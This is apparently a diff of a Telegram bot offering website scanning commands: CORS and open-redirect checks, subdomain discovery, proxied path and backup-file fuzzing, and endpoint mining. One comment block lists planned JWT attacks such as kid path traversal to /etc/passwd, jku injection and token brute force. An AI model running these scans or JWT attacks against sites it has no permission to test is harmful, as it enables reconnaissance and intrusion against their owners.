-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
-        return
-    domain = urlparse(url).netloc
-    msg = await update.effective_message.reply_text(
-        f"🌐 *Endpoint Discoverer — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
-    progress_q = []
-    async def _prog():
-        while True:
-            await asyncio.sleep(2)
-            if progress_q:
-                t = progress_q[-1]; progress_q.clear()
-                try: await msg.edit_text(f"🌐 *Endpoints — `{domain}`*\n\n{t}", parse_mode='Markdown')
-                except: pass
-    prog = asyncio.create_task(_prog())
-    try:
-        result = await asyncio.to_thread(_endpoints_sync, url, lambda t: progress_q.append(t))
-    except Exception as e:
-        prog.cancel(); await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown'); return
-    finally:
-        prog.cancel()
-    if result.get("error"):
-        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown'); return
-    findings = result["findings"]; page_url = result["page_url"]
-    if not findings:
-        await msg.edit_text(
-            f"🌐 *Endpoint Discoverer — `{domain}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"📭 No notable endpoints found\n🌐 `{page_url}`", parse_mode='Markdown')
-        return
-    lines = [f"🌐 *API Endpoints — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
-             f"🌐 `{page_url}`", f"✅ Found: `{len(findings)}`\n"]
-    for i, f in enumerate(findings, 1):
-        lines.append(f"*[{i}] {f['type']}*")
-        lines.append(f"  `{f['endpoint'][:100]}`")
-        lines.append(f"  _📂 {f['source'][:60]}_\n")
-    lines.append("━━━━━━━━━━━━━━━━━━\n⚠️ _Authorized testing only_")
-    report = "\n".join(lines)
-    try:
-        if len(report) <= 4000: await msg.edit_text(report, parse_mode='Markdown')
-        else: await msg.edit_text(report[:4000], parse_mode='Markdown')
-    except BadRequest:
-        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
-    import io as _io
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    safe_d = re.sub(r'[^\w\-]', '_', domain)
-    try:
-        await context.bot.send_document(
-            chat_id=update.effective_chat.id,
-            document=_io.BytesIO(json.dumps({"domain": domain, "page_url": page_url,
-                "scanned_at": datetime.now().isoformat(), "findings": findings},
-                indent=2, ensure_ascii=False).encode()),
-            filename=f"endpoints_{safe_d}_{ts}.json",
-            caption=f"🌐 Endpoints — `{domain}` — `{len(findings)}` found",
-            parse_mode='Markdown')
-    except Exception as e:
-        logger.warning("endpoints export error: %s", e)
-
-
-# ══════════════════════════════════════════════════
-# 🔒  8. /jwtlive — Live JWT Extractor from Browser
-# ══════════════════════════════════════════════════
+# ───────────────────────────────────────────────────────────────────
+# [5] REPLACE _oauthscan_sync (original: line ~17863)
+#     IMPROVEMENTS:
+#       + Extract all redirect_uri values from HTML/JS
+#       + PKCE detection (code_challenge_method)
+#       + Implicit flow: scan URL fragment #access_token
+#       + Missing state= → flag as CSRF risk
+#       + Scan /oauth/token /auth/token /token endpoints
+# ───────────────────────────────────────────────────────────────────
 
 _JWT_LIVE_JS_EVAL = """() => {
     const res = {tokens: []};
@@ -11825,9 +12287,8 @@ def _discover_subdomains_sync(base_url: str, progress_q: list) -> list:
     return live
 
 
-def _vuln_scan_sync(url: str, progress_q: list) -> dict:
-    """Main orchestrator."""
-    # Detect Cloudflare → increase delays
+def _vuln_scan_sync(url: str, progress_q: list, skip_subs: bool = False) -> dict:
+    """Improved orchestrator — parallel targets + CORS + open redirect."""
     is_cloudflare = False
     results = {
         "url": url, "findings": [],
@@ -11836,80 +12297,111 @@ def _vuln_scan_sync(url: str, progress_q: list) -> dict:
         "server": "Unknown", "subdomains_found": [],
         "total_scanned": 0, "errors": 0,
         "cloudflare": False,
+        "cors": {}, "open_redirects": [],
     }
 
     # ── Baseline headers ──────────────────────────
-    progress_q.append("🔍 Checking security headers...")
+    progress_q.append("🔍 Checking security headers + CORS...")
     try:
-        r0   = requests.get(url, timeout=10, headers=_get_headers(),
-                            proxies=proxy_manager.get_proxy(), allow_redirects=True, verify=False)
+        r0 = requests.get(
+            url, timeout=10, headers=_get_headers(),
+            proxies=proxy_manager.get_proxy(),
+            allow_redirects=True, verify=False
+        )
         hdrs = dict(r0.headers)
-        srv  = hdrs.get('Server','Unknown')
+        srv  = hdrs.get("Server", "Unknown")
         results["server"] = srv[:60]
-        is_cloudflare = 'cloudflare' in srv.lower() or 'cf-ray' in hdrs
+        is_cloudflare = "cloudflare" in srv.lower() or "cf-ray" in hdrs
         results["cloudflare"] = is_cloudflare
 
-        for hdr,(name,sev) in _SEC_HEADERS.items():
+        for hdr, (name, sev) in _SEC_HEADERS.items():
             if hdr not in hdrs:
-                results["missing_headers"].append((name,hdr,sev))
+                results["missing_headers"].append((name, hdr, sev))
         if srv and any(c.isdigit() for c in srv):
             results["missing_headers"].append(
                 ("Server version leak", f"Server: {srv[:50]}", "LOW"))
-        xpb = hdrs.get('X-Powered-By','')
+        xpb = hdrs.get("X-Powered-By", "")
         if xpb:
             results["missing_headers"].append(
                 ("Tech disclosure", f"X-Powered-By: {xpb[:40]}", "LOW"))
-        has_xfo = 'X-Frame-Options' in hdrs
-        has_fa  = 'frame-ancestors' in hdrs.get('Content-Security-Policy','')
+        has_xfo = "X-Frame-Options" in hdrs
+        has_fa  = "frame-ancestors" in hdrs.get("Content-Security-Policy", "")
         results["clickjacking"] = not has_xfo and not has_fa
     except Exception:
         results["errors"] += 1
 
-    # Cloudflare = slower scan to avoid rate limiting
-    req_delay = 0.8 if is_cloudflare else 0.2
-    sub_workers = 5 if is_cloudflare else 10
-
-    if is_cloudflare:
+    # ── CORS check ────────────────────────────────
+    cors_result = _check_cors_misconfig(url)
+    results["cors"] = cors_result
+    if cors_result["vulnerable"]:
+        sev = cors_result["severity"]
         progress_q.append(
-            "☁️ *Cloudflare detected*\n"
-            "Slower scan mode to avoid rate limiting..."
+            f"🚨 CORS misconfiguration — `{sev}`\n"
+            f"ACAO: `{cors_result['acao']}`\n"
+            f"Credentials: `{cors_result.get('acac','false')}`"
         )
+
+    # ── Open redirect ─────────────────────────────
+    progress_q.append("🔀 Testing open redirect payloads...")
+    results["open_redirects"] = _check_open_redirect(url)
+    if results["open_redirects"]:
+        progress_q.append(
+            f"🟠 Open redirect found — `{len(results['open_redirects'])}` params vulnerable"
+        )
+
+    req_delay   = 0.8 if is_cloudflare else 0.2
+    if is_cloudflare:
+        progress_q.append("☁️ *Cloudflare detected* — slower scan mode...")
 
     # ── Subdomain discovery ───────────────────────
-    live_subs = _discover_subdomains_sync(url, progress_q)
-    results["subdomains_found"] = live_subs
-
-    if live_subs:
-        progress_q.append(
-            f"✅ *{len(live_subs)} real subdomains found:*\n"
-            + "\n".join(f"  • `{urlparse(s).netloc}`" for s in live_subs[:8])
-        )
+    if not skip_subs:
+        live_subs = _discover_subdomains_sync(url, progress_q)
+        results["subdomains_found"] = live_subs
+        if live_subs:
+            progress_q.append(
+                f"✅ *{len(live_subs)} subdomains found:*\n"
+                + "\n".join(f"  • `{urlparse(s).netloc}`" for s in live_subs[:8])
+            )
+        else:
+            progress_q.append("📭 No live subdomains found")
     else:
-        progress_q.append("📭 No live subdomains found")
+        progress_q.append("⏭️ Subdomain scan skipped")
 
-    # ── Scan each target ──────────────────────────
-    all_targets = [url] + live_subs
-    for i, target in enumerate(all_targets):
-        netloc = urlparse(target).netloc
-        progress_q.append(
-            f"🔍 Scanning `{netloc}`...\n"
-            f"Target `{i+1}/{len(all_targets)}`"
-            + (" ☁️ slow mode" if is_cloudflare else "")
-        )
+    # ── Parallel target scan ──────────────────────
+    all_targets = [url] + results["subdomains_found"]
+    progress_q.append(
+        f"🔍 Scanning `{len(all_targets)}` target(s) in parallel..."
+    )
+
+    def _scan_one(target):
         exposed, protected, catchall = _scan_target_sync(target, req_delay)
-        results["total_scanned"] += len(_VULN_PATHS)
-        if exposed or protected:
-            results["findings"].append({
-                "target":    target,
-                "netloc":    netloc,
-                "exposed":   exposed,
-                "protected": protected,
-                "catchall":  catchall,
-            })
+        return {
+            "target":    target,
+            "netloc":    urlparse(target).netloc,
+            "exposed":   exposed,
+            "protected": protected,
+            "catchall":  catchall,
+        }
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(all_targets), 6)) as ex:
+        futures = {ex.submit(_scan_one, t): t for t in all_targets}
+        for fut in concurrent.futures.as_completed(futures, timeout=180):
+            try:
+                r = fut.result(timeout=30)
+                results["total_scanned"] += len(_VULN_PATHS)
+                if r["exposed"] or r["protected"]:
+                    results["findings"].append(r)
+                netloc = r["netloc"]
+                exp_cnt = len(r["exposed"])
+                if exp_cnt:
+                    progress_q.append(f"🚨 `{netloc}` — `{exp_cnt}` exposed paths found")
+            except Exception:
+                results["errors"] += 1
 
     return results
 
 
+# ── Also patch _format_vuln_report to show CORS + redirect ──────────
 def _format_vuln_report(r: dict) -> str:
     domain = urlparse(r["url"]).netloc
     lines  = []
@@ -11917,11 +12409,15 @@ def _format_vuln_report(r: dict) -> str:
     total_exp = sum(len(f["exposed"]) for f in r["findings"])
     all_sevs  = [fi["severity"] for f in r["findings"] for fi in f["exposed"]]
 
-    if   "CRITICAL" in all_sevs:                       overall = "🔴 CRITICAL RISK"
-    elif "HIGH"     in all_sevs:                       overall = "🟠 HIGH RISK"
-    elif "MEDIUM"   in all_sevs or r["clickjacking"]:  overall = "🟡 MEDIUM RISK"
-    elif r["missing_headers"]:                         overall = "🔵 LOW RISK"
-    else:                                              overall = "✅ CLEAN"
+    cors_vuln = r.get("cors", {}).get("vulnerable", False)
+    cors_sev  = r.get("cors", {}).get("severity", "")
+    redirects = r.get("open_redirects", [])
+
+    if "CRITICAL" in all_sevs or cors_sev == "CRITICAL": overall = "🔴 CRITICAL RISK"
+    elif "HIGH" in all_sevs or redirects or cors_sev == "HIGH": overall = "🟠 HIGH RISK"
+    elif "MEDIUM" in all_sevs or r["clickjacking"]: overall = "🟡 MEDIUM RISK"
+    elif r["missing_headers"]: overall = "🔵 LOW RISK"
+    else: overall = "✅ CLEAN"
 
     cf_badge = " ☁️ Cloudflare" if r.get("cloudflare") else ""
     lines += [
@@ -11934,6 +12430,24 @@ def _format_vuln_report(r: dict) -> str:
         "",
     ]
 
+    # CORS result
+    lines.append("*🌐 CORS Policy:*")
+    if cors_vuln:
+        sev = r["cors"]["severity"]
+        em  = "🔴" if sev == "CRITICAL" else "🟠"
+        lines.append(f"  {em} `{sev}` — {r['cors']['note']}")
+        lines.append(f"  ACAO: `{r['cors']['acao']}`")
+    else:
+        lines.append("  ✅ No origin reflection")
+    lines.append("")
+
+    # Open redirect
+    if redirects:
+        lines.append(f"*🔀 Open Redirect:* `{len(redirects)}` params vulnerable")
+        for rd in redirects[:3]:
+            lines.append(f"  🟠 `?{rd['param']}=` → `{rd['location'][:60]}`")
+        lines.append("")
+
     # Subdomains
     if r["subdomains_found"]:
         lines.append("*📡 Live Subdomains:*")
@@ -11941,33 +12455,29 @@ def _format_vuln_report(r: dict) -> str:
             lines.append(f"  • {s}")
         lines.append("")
 
-    # HTTPS
     lines.append("*🔐 HTTPS:*")
     lines.append("  ✅ HTTPS enabled" if r["https"] else "  🔴 HTTP only — no encryption!")
     lines.append("")
 
-    # Findings per target
     if r["findings"]:
         for f in r["findings"]:
             if f["exposed"]:
                 lines.append(f"*🚨 Exposed — `{f['netloc']}`:*")
                 for fi in f["exposed"]:
-                    em   = _SEV_EMOJI.get(fi["severity"],"⚪")
-                    note = f" `[{fi['status']}]`"
-                    lines.append(f"  {em} `{fi['severity']}` — {fi['label']}{note}")
+                    em   = _SEV_EMOJI.get(fi["severity"], "⚪")
+                    lines.append(f"  {em} `{fi['severity']}` — {fi['label']} `[{fi['status']}]`")
                     lines.append(f"  🔗 {fi['full_url']}")
                 lines.append("")
             if f["protected"]:
-                lines.append(f"*⚠️ Blocked (403) — `{f['netloc']}`:*")
+                lines.append(f"*⚠️ Gated (401/403) — `{f['netloc']}`:*")
                 for fi in f["protected"][:5]:
-                    em = _SEV_EMOJI.get(fi["severity"],"⚪")
+                    em = _SEV_EMOJI.get(fi["severity"], "⚪")
                     lines.append(f"  {em} {fi['label']}")
                     lines.append(f"  🔗 {fi['full_url']}")
                 lines.append("")
     else:
         lines += ["*✅ No exposed files found*", ""]
 
-    # Clickjacking
     lines.append("*🖼️ Clickjacking:*")
     if r["clickjacking"]:
         lines.append("  🟠 Vulnerable — no X-Frame-Options / frame-ancestors")
@@ -11975,346 +12485,32 @@ def _format_vuln_report(r: dict) -> str:
         lines.append("  ✅ Protected")
     lines.append("")
 
-    # Security headers
     if r["missing_headers"]:
         lines.append("*📋 Security Header Issues:*")
         for name, hdr, sev in r["missing_headers"][:8]:
-            em = _SEV_EMOJI.get(sev,"⚪")
+            em = _SEV_EMOJI.get(sev, "⚪")
             if "leak" in name.lower() or "disclosure" in name.lower():
                 lines.append(f"  {em} {name}: `{hdr}`")
             else:
                 lines.append(f"  {em} Missing *{name}*")
         lines.append("")
 
-    # Cloudflare note
-    if r.get("cloudflare"):
-        lines += [
-            "☁️ *Cloudflare note:*",
-            "  Some paths may be hidden behind CF WAF.",
-            "  403 results may indicate file exists but CF blocks it.",
-            "",
-        ]
-
-    lines += ["━━━━━━━━━━━━━━━━━━",
-              "⚠️ _Passive scan only — no exploitation_"]
+    lines += [
+        "━━━━━━━━━━━━━━━━━━",
+        "⚠️ _Passive scan only — no exploitation_",
+    ]
     return "\n".join(lines)
 
 
-async def cmd_vuln(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/vuln <url> — Passive vuln scanner with CF-aware subdomain discovery."""
-    if not context.args:
-        await update.effective_message.reply_text(
-            "🛡️ *Vulnerability Scanner v4*\n\n"
-            "Usage: `/vuln <url>`\n\n"
-            "Features:\n"
-            "• 📡 Subdomain discovery (DNS verified)\n"
-            "• ☁️ Cloudflare detection + slow-mode\n"
-            "• 🔍 Catch-all false-positive filter\n"
-            "• 🔑 Config / credential leaks\n"
-            "• 📁 Git / backup / DB dumps\n"
-            "• 🔐 Admin panel detection\n"
-            "• 🔗 Full clickable URLs\n\n"
-            "_Passive only — no exploitation_",
-            parse_mode='Markdown'
-        )
-        return
-
-    url = context.args[0]
-    if not url.startswith('http'):
-        url = 'https://' + url
-
-    uid = update.effective_user.id
-    allowed, wait_sec = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(
-            f"⏱️ `{wait_sec}` seconds စောင့်ပါ",
-            parse_mode='Markdown'); return
-
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(
-            f"🚫 `{reason}`", parse_mode='Markdown'); return
-
-    domain = urlparse(url).netloc
-    msg = await update.effective_message.reply_text(
-        f"🛡️ *Vuln Scan v4*\n🌐 `{domain}`\n\n"
-        f"• Baseline & catch-all detection\n"
-        f"• Subdomain discovery\n"
-        f"• Path scanning\n\n_ခဏစောင့်ပါ..._",
-        parse_mode='Markdown'
-    )
-
-    progress_q: list = []
-
-    async def _prog_loop():
-        while True:
-            await asyncio.sleep(3)
-            if progress_q:
-                txt = progress_q[-1]; progress_q.clear()
-                try:
-                    await msg.edit_text(
-                        f"🛡️ *Scanning `{domain}`*\n\n{txt}",
-                        parse_mode='Markdown')
-                except Exception: pass
-
-    prog = asyncio.create_task(_prog_loop())
-    try:
-        results = await asyncio.to_thread(_vuln_scan_sync, url, progress_q)
-    except Exception as e:
-        prog.cancel()
-        await msg.edit_text(
-            f"❌ Scan error: `{type(e).__name__}: {str(e)[:80]}`",
-            parse_mode='Markdown'); return
-    finally:
-        prog.cancel()
-
-    report = _format_vuln_report(results)
-    try:
-        if len(report) <= 4000:
-            await msg.edit_text(report, parse_mode='Markdown')
-        else:
-            await msg.edit_text(report[:4000] + "\n_...continued_", parse_mode='Markdown')
-            await update.effective_message.reply_text(report[4000:], parse_mode='Markdown')
-    except Exception:
-        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
-
-
-# ══════════════════════════════════════════════════
-# 🔌  /api — API ENDPOINT DISCOVERY COMMAND
-# ══════════════════════════════════════════════════
-
-async def cmd_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/api <url> — Discover API endpoints, RSS feeds, hidden paths"""
-    uid = update.effective_user.id
-    if not context.args:
-        await update.effective_message.reply_text(
-            "📌 *Usage:* `/api https://example.com`\n\n"
-            "🔍 *Discovery Method 4 ခု:*\n"
-            "① HTML source mining _(data-attrs, inline JS)_\n"
-            "② JS bundle mining _(fetch/axios/url patterns)_\n"
-            "③ robots.txt / sitemap scan\n"
-            f"④ `{len(ALL_API_PATHS)}` known paths brute-force\n\n"
-            "🔌 *ရှာပေးသောအမျိုးအစားများ:*\n"
-            "• REST API (v1/v2/v3)\n"
-            "• GraphQL endpoints\n"
-            "• WordPress / WooCommerce / Shopify\n"
-            "• Auth (JWT, OAuth, Sanctum)\n"
-            "• Admin / Dashboard APIs\n"
-            "• Mobile / SaaS / Fintech APIs\n"
-            "• Swagger / OpenAPI docs\n"
-            "• RSS/Atom feeds\n"
-            "• CORS detection\n\n"
-            "📦 *Result ကို JSON file နဲ့ download ပေးမယ်*",
-            parse_mode='Markdown'
-        )
-        return
-
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text("`%ds` စောင့်ပါ" % wait, parse_mode="Markdown")
-        return
-
-    url = context.args[0].strip()
-    if not url.startswith('http'):
-        url = 'https://' + url
-
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
-        return
-
-    domain = urlparse(url).netloc
-    msg    = await update.effective_message.reply_text(
-        f"🔌 *API Discovery — `{domain}`*\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🔍 Phase 1: HTML source mining...\n"
-        f"📦 Phase 2: JS bundle mining...\n"
-        f"🤖 Phase 3: robots.txt scan...\n"
-        f"🔌 Phase 4: `{len(ALL_API_PATHS)}` paths brute-force...\n\n"
-        f"⏳ ခဏစောင့်ပါ...",
-        parse_mode='Markdown'
-    )
-
-    progress_q: list = []
-
-    async def _prog_loop():
-        while True:
-            await asyncio.sleep(4)
-            if progress_q:
-                txt = progress_q[-1]; progress_q.clear()
-                try:
-                    await msg.edit_text(
-                        f"🔌 *Scanning `{domain}`*\n\n{txt}",
-                        parse_mode='Markdown')
-                except Exception: pass
-
-    prog = asyncio.create_task(_prog_loop())
-    try:
-        found = await asyncio.to_thread(
-            discover_api_endpoints, url, lambda t: progress_q.append(t)
-        )
-    except Exception as e:
-        prog.cancel()
-        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
-        return
-    finally:
-        prog.cancel()
-
-    result    = found   # found is now a dict
-    endpoints = result.get("found", [])
-    js_mined  = result.get("js_mined", [])
-    html_mined= result.get("html_mined", [])
-    robots    = result.get("robots", [])
-    stats     = result.get("stats", {})
-
-    # ── Summary message ───────────────────────────
-    json_apis = [e for e in endpoints if e["type"] in ("JSON_API", "GRAPHQL")]
-    xml_feeds = [e for e in endpoints if e["type"] == "XML/RSS"]
-    api_docs  = [e for e in endpoints if e["type"] == "API_DOCS"]
-    protected = [e for e in endpoints if e["type"] == "PROTECTED"]
-    others    = [e for e in endpoints if e["type"] == "OTHER"]
-    cors_list = [e for e in endpoints if e.get("cors")]
-
-    all_mined = list(set(js_mined + html_mined + robots))
-
-    if not endpoints and not all_mined:
-        await msg.edit_text(
-            f"🔌 *API Discovery — `{domain}`*\n\n"
-            f"📭 API endpoints မတွေ့ပါ\n"
-            f"_(protected or non-standard paths ဖြစ်နိုင်)_\n\n"
-            f"🔍 Probed: `{stats.get('total_probed',0)}` paths",
-            parse_mode='Markdown'
-        )
-        return
-
-    report_lines = [
-        f"🔌 *API Discovery — `{domain}`*",
-        f"━━━━━━━━━━━━━━━━━━━━",
-        f"📊 Endpoints: `{len(endpoints)}` | 🔍 Probed: `{stats.get('total_probed',0)}`",
-        f"📦 JS mined: `{stats.get('js_urls_found',0)}` | 🌐 HTML mined: `{stats.get('html_urls_found',0)}`",
-        "",
-    ]
-
-    if json_apis:
-        report_lines.append(f"*✅ JSON / GraphQL APIs ({len(json_apis)}):*")
-        for e in json_apis[:20]:
-            path = urlparse(e["url"]).path or e["url"]
-            tag  = " 〔GraphQL〕" if e["type"] == "GRAPHQL" else ""
-            cors = " ✦CORS" if e.get("cors") else ""
-            prev = e.get("preview","")[:60].replace("\n"," ")
-            report_lines.append(f"  🟢 `{path}`{tag}{cors}")
-            if prev: report_lines.append(f"     _{prev}_")
-        report_lines.append("")
-
-    if xml_feeds:
-        report_lines.append(f"*📰 RSS / XML Feeds ({len(xml_feeds)}):*")
-        for e in xml_feeds[:10]:
-            path = urlparse(e["url"]).path or e["url"]
-            report_lines.append(f"  📡 `{path}`")
-        report_lines.append("")
-
-    if api_docs:
-        report_lines.append(f"*📖 API Docs / Swagger ({len(api_docs)}):*")
-        for e in api_docs[:5]:
-            path = urlparse(e["url"]).path or e["url"]
-            report_lines.append(f"  📘 `{path}`")
-        report_lines.append("")
-
-    if protected:
-        report_lines.append(f"*🔒 Protected — Exists ({len(protected)}):*")
-        for e in protected[:10]:
-            path = urlparse(e["url"]).path or e["url"]
-            note = f" [{e.get('note',e['status'])}]"
-            cors = " ✦CORS" if e.get("cors") else ""
-            report_lines.append(f"  🔐 `{path}`{note}{cors}")
-        report_lines.append("")
-
-    if all_mined:
-        unique_mined = sorted(set(
-            urlparse(u).path for u in all_mined if urlparse(u).path
-        ))[:20]
-        report_lines.append(f"*🕵️ Mined from JS/HTML ({len(all_mined)} total):*")
-        for p in unique_mined:
-            report_lines.append(f"  🔎 `{p}`")
-        report_lines.append("")
-
-    if others:
-        report_lines.append(f"*📄 Other ({len(others)}):*")
-        for e in others[:5]:
-            path = urlparse(e["url"]).path or e["url"]
-            report_lines.append(f"  📋 `{path}`")
-        report_lines.append("")
-
-    if cors_list:
-        report_lines.append(f"*🌍 CORS Enabled ({len(cors_list)}):*")
-        for e in cors_list[:5]:
-            path = urlparse(e["url"]).path
-            report_lines.append(f"  🌐 `{path}` → `{e['cors']}`")
-        report_lines.append("")
-
-    report_lines.append("⚠️ _Passive scan only — no exploitation_")
-
-    report_text = "\n".join(report_lines)
-
-    # ── Send text report ──────────────────────────
-    try:
-        if len(report_text) <= 4000:
-            await msg.edit_text(report_text, parse_mode='Markdown')
-        else:
-            await msg.edit_text(report_text[:4000], parse_mode='Markdown')
-            await update.effective_message.reply_text(
-                report_text[4000:8000], parse_mode='Markdown')
-    except Exception:
-        await update.effective_message.reply_text(
-            report_text[:4000], parse_mode='Markdown')
-
-    # ── Export full JSON report + send as file ────
-    if endpoints or all_mined:
-        try:
-            safe_domain = re.sub(r'[^\w\-]', '_', domain)
-            ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
-            json_path   = os.path.join(DOWNLOAD_DIR, f"api_{safe_domain}_{ts}.json")
-
-            export_data = {
-                "domain":     domain,
-                "scanned_at": datetime.now().isoformat(),
-                "stats":      stats,
-                "endpoints": [{
-                    "url":     e["url"],
-                    "type":    e["type"],
-                    "status":  e["status"],
-                    "cors":    e.get("cors"),
-                    "preview": e.get("preview","")[:200],
-                    "size_b":  e.get("size_b",0),
-                } for e in endpoints],
-                "js_mined":   list(set(js_mined)),
-                "html_mined": list(set(html_mined)),
-                "robots":     robots,
-            }
-
-            with open(json_path, 'w', encoding='utf-8') as jf:
-                json.dump(export_data, jf, ensure_ascii=False, indent=2)
-
-            cap = (
-                f"📦 *API Report — `{domain}`*\n"
-                f"✅ `{len(endpoints)}` endpoints | 🕵️ `{len(all_mined)}` mined\n"
-                f"🗓 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
-            )
-            with open(json_path, 'rb') as jf:
-                await context.bot.send_document(
-                    chat_id=update.effective_chat.id,
-                    document=jf,
-                    filename=f"api_{safe_domain}_{ts}.json",
-                    caption=cap,
-                    parse_mode='Markdown'
-                )
-            os.remove(json_path)
-        except Exception as e:
-            logger.warning("API JSON export error: %s", e)
-
-
-
+# ───────────────────────────────────────────────────────────────────
+# [2] REPLACE JWT functions (original: lines ~5482–5600)
+#     IMPROVEMENTS:
+#       + kid path traversal injection (/etc/passwd, SQLi)
+#       + JWKS endpoint spoof detection + jku/x5u injection
+#       + exp=9999999999 timestamp forgery
+#       + Parallel brute-force (ThreadPoolExecutor)
+#       + All-in-one combined attack report
+# ───────────────────────────────────────────────────────────────────
 
 def download_website(
     base_url: str,
@@ -13793,10 +13989,10 @@ _FUZZ_PARAMS = [
 ]
 
 def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
-    """Run path or parameter fuzzing."""
-    found    = []
+    """Improved fuzzer — tech-aware + backup ext + param + response diff."""
+    found = []
 
-    # ── Baseline: get 404 fingerprint ───────────────
+    # Baseline fingerprint
     try:
         r404 = requests.get(
             base.rstrip("/") + "/this_path_will_never_exist_xyz_abc_123",
@@ -13806,39 +14002,46 @@ def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
         baseline_status = r404.status_code
         baseline_size   = len(r404.content)
         baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
+        baseline_words  = len(r404.text.split()) if r404.text else 0
     except Exception:
-        baseline_status, baseline_size, baseline_hash = 404, 0, ""
+        baseline_status, baseline_size, baseline_hash, baseline_words = 404, 0, "", 0
 
-    def _is_interesting(r_status, r_size, r_hash):
-        """Filter out baseline 404 catch-all responses."""
+    def _is_interesting(r_status, r_size, r_hash, r_words):
         if r_status == baseline_status:
             if r_hash and r_hash == baseline_hash:
                 return False
             if baseline_size > 0 and abs(r_size - baseline_size) < 50:
+                return False
+            if baseline_words > 0 and abs(r_words - baseline_words) < 5:
                 return False
         return r_status in (200, 201, 204, 301, 302, 307, 401, 403, 500)
 
     def _probe(target_url):
         try:
             r = requests.get(
-                target_url, timeout=5, verify=False, headers=_get_headers(),
-                allow_redirects=True, stream=True,
-                proxies=proxy_manager.get_proxy()
+                target_url, timeout=5, verify=False,
+                headers=_get_headers(), allow_redirects=True,
+                stream=True, proxies=proxy_manager.get_proxy()
             )
             chunk = b""
-            for part in r.iter_content(1024):
+            for part in r.iter_content(2048):
                 chunk += part
-                if len(chunk) >= 1024: break
+                if len(chunk) >= 2048:
+                    break
             r.close()
-            r_size = int(r.headers.get("Content-Length", len(chunk)))
-            r_hash = hashlib.md5(chunk[:512]).hexdigest()
-            r_ct   = r.headers.get("Content-Type","")[:30]
-            if _is_interesting(r.status_code, r_size, r_hash):
+            r_size  = int(r.headers.get("Content-Length", len(chunk)))
+            r_hash  = hashlib.md5(chunk[:512]).hexdigest()
+            r_ct    = r.headers.get("Content-Type", "")[:40]
+            r_words = len(chunk.decode("utf-8", "ignore").split())
+
+            if _is_interesting(r.status_code, r_size, r_hash, r_words):
+                gated = r.status_code in (401, 403)
                 return {
                     "url":    target_url,
                     "status": r.status_code,
                     "size":   r_size,
                     "ct":     r_ct,
+                    "gated":  gated,
                     "title":  "",
                 }
         except Exception:
@@ -13846,18 +14049,40 @@ def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
         return None
 
     if mode == "params":
-        targets = [f"{base}?{p}=FUZZ" for p in _FUZZ_PARAMS]
+        # Param fuzzing with multiple values
+        targets = []
+        for param, values in _SMART_FUZZ_PARAMS.items():
+            for val in values[:2]:
+                targets.append(f"{base}?{param}={val}")
+        # Also original params
+        for p in _FUZZ_PARAMS:
+            targets.append(f"{base}?{p}=FUZZ")
     else:
-        targets = [f"{base.rstrip('/')}/{p}" for p in _FUZZ_PATHS]
+        base_paths = list(_FUZZ_PATHS)
+        # Tech-aware extras
+        detected = _detect_tech_stack(base)
+        if detected:
+            progress_q.append(f"🔬 Detected: `{'`, `'.join(detected)}`")
+        for tech in detected:
+            base_paths.extend(_TECH_WORDLISTS.get(tech, []))
+
+        # Backup extension permutations (on top 30 paths)
+        backup_targets = []
+        for path in base_paths[:30]:
+            for ext in _BACKUP_EXTENSIONS:
+                backup_targets.append(path.rstrip("/") + ext)
+
+        targets = [f"{base.rstrip('/')}/{p}" for p in base_paths]
+        targets += [f"{base.rstrip('/')}/{p}" for p in backup_targets]
 
     done = 0
     with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
         fmap = {ex.submit(_probe, t): t for t in targets}
-        for fut in concurrent.futures.as_completed(fmap, timeout=90):
+        for fut in concurrent.futures.as_completed(fmap, timeout=120):
             done += 1
-            if done % 20 == 0:
+            if done % 25 == 0:
                 progress_q.append(
-                    f"🧪 Fuzzing... `{done}/{len(targets)}` tested | `{len(found)}` found"
+                    f"🧪 Fuzzing `{done}/{len(targets)}` | Found: `{len(found)}`"
                 )
             try:
                 res = fut.result(timeout=8)
@@ -13866,370 +14091,10 @@ def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
             except Exception:
                 pass
 
-    found.sort(key=lambda x: (x["status"] != 200, x["status"]))
+    # Sort: 200 first, then gated (401/403), then rest
+    found.sort(key=lambda x: (x["status"] != 200, not x.get("gated"), x["status"]))
     return found, baseline_status
 
-
-async def cmd_fuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/fuzz <url> [paths|params] — HTTP path & parameter fuzzer"""
-    if not context.args:
-        await update.effective_message.reply_text(
-            "📌 *Usage:*\n"
-            f"`/fuzz https://example.com` — Path fuzzing ({len(_FUZZ_PATHS)} paths)\n"
-            f"`/fuzz https://example.com params` — Parameter fuzzing ({len(_FUZZ_PARAMS)} params)\n\n"
-            "🧪 *Path mode detects:*\n"
-            "  • Hidden admin panels & login pages\n"
-            "  • Backup & config files (.env, .sql, .bak)\n"
